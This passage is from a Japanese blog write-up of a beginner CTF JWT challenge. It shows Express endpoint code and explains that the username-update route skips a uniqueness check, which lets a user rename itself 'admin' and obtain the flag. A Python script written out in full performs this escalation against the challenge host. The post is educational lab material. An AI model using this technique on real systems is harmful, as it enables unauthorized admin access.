</span></span><span style=display:flex><span>  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Server is running on port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>PORT</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>ユーザー登録エンドポイント（<code>/signup</code>）では、<code>id</code>、<code>username</code>、<code>password</code>を送信してユーザー登録を行います。</p><p>サインインエンドポイント（<code>/signin</code>）では、送信する<code>id</code>、<code>password</code>に対応するユーザーの<code>id</code>、<code>username</code>、<code>solved</code>をペイロードとした、HS256アルゴリズムで署名されたJWTが返されます。</p><p>flag取得エンドポイント（<code>/flag</code>）では、JWTのペイロードの<code>username</code>パラメータの値が<code>admin</code>である場合にflagが得られます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#75715e>// flag取得エンドポイント
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/flag&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>verified</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>),
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>secret</span>, 
</span></span><span style=display:flex><span>      { <span style=color:#a6e22e>algorithms</span><span style=color:#f92672>:</span> [<span style=color:#e6db74>&#34;HS256&#34;</span>] }
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Invalid Token&#34;</span> });
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>verified</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span>) {
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>`Congratulations! Here&#39;s your flag: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>FLAG</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>JWTの検証時に使用される共通鍵は以下で生成されるため、総当たり攻撃などで秘密鍵を直接求めることはできず、JWTを改ざんすることは困難です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#75715e>// シークレットキーを生成
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>secret</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>crypto</span>.<span style=color:#a6e22e>randomBytes</span>(<span style=color:#ae81ff>16</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#e6db74>&#34;hex&#34;</span>);
</span></span></code></pre></div><h1 id=解法>解法</h1><p>まず、JWTペイロードの<code>username</code>パラメータの値がどのように指定されるかを確認します。</p><p>サインインエンドポイント（<code>/signin</code>）を確認すると、保存されているユーザーの<code>username</code>がペイロードの<code>username</code>パラメータの値として指定されていることがわかります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#75715e>// サインインエンドポイント
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/signin&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>id</span>, <span style=color:#a6e22e>password</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>users</span>.<span style=color:#a6e22e>find</span>(<span style=color:#a6e22e>u</span> =&gt; <span style=color:#a6e22e>u</span>.<span style=color:#a6e22e>id</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>id</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>u</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>password</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>user</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Invalid id or password&#34;</span> });
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>signed</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>signed</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>sign</span>({
</span></span><span style=display:flex><span>        ...
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span>,
</span></span><span style=display:flex><span>        ...
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>secret</span>, 
</span></span><span style=display:flex><span>      { <span style=color:#a6e22e>algorithm</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;HS256&#34;</span>, <span style=color:#a6e22e>expiresIn</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;1h&#34;</span> } 
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>500</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Internal server error&#34;</span> });
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  ...
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>そこでユーザー登録時に<code>username</code>を<code>admin</code>に指定することで、ペイロードの<code>username</code>パラメータの値を<code>admin</code>にすることを考えます。</p><p>しかし、ユーザー登録エンドポイント（<code>/signup</code>）では、<code>username</code>パラメータの値が既に登録されているユーザーの<code>username</code>と一致する場合にエラーが返されるため、<code>username</code>パラメータの値を<code>admin</code>に指定することはできません。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#75715e>// ユーザー登録エンドポイント
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/signup&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>id</span>, <span style=color:#a6e22e>username</span>, <span style=color:#a6e22e>password</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isUserPropertyExist</span>(<span style=color:#e6db74>&#39;username&#39;</span>, <span style=color:#a6e22e>username</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Username already exists&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>users</span>.<span style=color:#a6e22e>push</span>({
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>id</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>username</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>password</span>
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;User registered successfully&#34;</span> });
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>ここでユーザー名更新エンドポイント（<code>/username/update</code>）に着目します。</p><p>このエンドポイントではユーザーの<code>username</code>が更新できますが、更新の際に<code>newUsername</code>の値が既に登録されているユーザーの<code>username</code>と一致するかどうかの検証がなされていません。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#75715e>// ユーザー名更新エンドポイント
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/username/update&#34;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>newUsername</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Authorization&#34;</span>);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// usernameの一致検証がない！！
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    ...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>verified</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>secret</span>, { <span style=color:#a6e22e>algorithms</span><span style=color:#f92672>:</span> [<span style=color:#e6db74>&#34;HS256&#34;</span>] });
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Invalid Token&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>currentId</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>verified</span>.<span style=color:#a6e22e>id</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>users</span>.<span style=color:#a6e22e>find</span>(<span style=color:#a6e22e>u</span> =&gt; <span style=color:#a6e22e>u</span>.<span style=color:#a6e22e>id</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>currentId</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>user</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>404</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;User not found&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>403</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Admin user cannot change its username&#34;</span> });
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// newUsernameをadminにすることでユーザーのusernameをadminに更新できる
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>newUsername</span>;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>message</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Username updated successfully&#34;</span> });
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>そのため、適当な<code>username</code>でユーザー登録を行い、ユーザー名更新エンドポイント（<code>/username/update</code>）で<code>username</code>を<code>admin</code>に更新することで、JWTペイロードの<code>username</code>パラメータの値を<code>admin</code>にすることができます。</p><p>その状態でもう一度サインインを行い、取得したJWTをflag取得エンドポイント（<code>/flag</code>）に送信することでflagが得られます。</p><p>以下はPythonで実装した問題を解くための一連のプログラムです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> jwt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://2023-beginnerslive-jwt-chall.vercel.app&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;user</span><span style=color:#e6db74>{</span>random<span style=color:#f92672>.</span>randint(<span style=color:#ae81ff>10000</span>, <span style=color:#ae81ff>99999</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>signup_data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;id&#34;</span>: username,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;username&#34;</span>: username,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;password123&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># /signup</span>
</span></span><span style=display:flex><span>signup_response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>HOST<span style=color:#e6db74>}</span><span style=color:#e6db74>/signup&#34;</span>, json<span style=color:#f92672>=</span>signup_data)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;/signup:&#34;</span>, signup_response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># /signin as user</span>
</span></span><span style=display:flex><span>signin_data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;id&#34;</span>: username,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;password123&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>signin_response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>HOST<span style=color:#e6db74>}</span><span style=color:#e6db74>/signin&#34;</span>, json<span style=color:#f92672>=</span>signin_data)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;/signin:&#34;</span>, signin_response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>encoded_jwt <span style=color:#f92672>=</span> signin_response<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Authorization&#39;</span>]
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;encoded jwt:&#34;</span>, encoded_jwt)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;jwt payload:&#34;</span>, jwt<span style=color:#f92672>.</span>decode(encoded_jwt, options<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;verify_signature&#34;</span>: <span style=color:#66d9ef>False</span>}))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Update username to admin</span>
</span></span><span style=display:flex><span>update_data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;newUsername&#34;</span>: <span style=color:#e6db74>&#34;admin&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>update_headers <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;Authorization&#34;</span>: signin_response<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Authorization&#39;</span>]}
</span></span><span style=display:flex><span>update_response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>HOST<span style=color:#e6db74>}</span><span style=color:#e6db74>/username/update&#34;</span>, json<span style=color:#f92672>=</span>update_data, headers<span style=color:#f92672>=</span>update_headers)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;/username/update:&#34;</span>, update_response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># /signin as admin</span>
</span></span><span style=display:flex><span>signin_data <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;id&#34;</span>: username,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;password123&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>signin_response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>HOST<span style=color:#e6db74>}</span><span style=color:#e6db74>/signin&#34;</span>, json<span style=color:#f92672>=</span>signin_data)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;/signin:&#34;</span>, signin_response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>encoded_jwt <span style=color:#f92672>=</span> signin_response<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Authorization&#39;</span>]
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;encoded jwt:&#34;</span>, encoded_jwt)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;jwt payload:&#34;</span>, jwt<span style=color:#f92672>.</span>decode(encoded_jwt, options<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;verify_signature&#34;</span>: <span style=color:#66d9ef>False</span>}))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># /flag</span>
</span></span><span style=display:flex><span>flag_response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>HOST<span style=color:#e6db74>}</span><span style=color:#e6db74>/flag&#34;</span>, headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;Authorization&#34;</span>: encoded_jwt})
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;/flag:&#34;</span>, flag_response<span style=color:#f92672>.</span>text) <span style=color:#75715e># Congratulations! Here&#39;s your flag: flag{this_is_trial3_flag}</span>
</span></span></code></pre></div><h1 id=おわりに>おわりに</h1><p>JWTチャレンジに挑戦してくださった方々、ありがとうございました！</p><p>講義で紹介したJWTの脆弱性についても<a href=https://github.com/SECCON/2023_beginnerslive/tree/main/yuasa>ラボ環境</a>を用いて検証することができますので、ぜひ試してみてください。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/event>event</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>